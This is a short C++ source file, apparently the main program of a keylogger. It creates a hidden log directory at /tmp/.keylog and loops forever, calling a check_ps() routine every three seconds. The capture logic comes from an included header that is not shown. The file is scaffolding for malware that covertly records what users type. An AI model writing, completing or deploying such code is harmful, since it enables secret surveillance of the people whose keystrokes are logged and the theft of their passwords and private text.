#include "keylogger.hpp"

int main() {
    const fs::path path_to_log = "/tmp/.keylog";
    int64_t sleep_time = 3;
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        std::cout << "DIR is created" << std::endl;
    }

    while(true){
        check_ps();
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}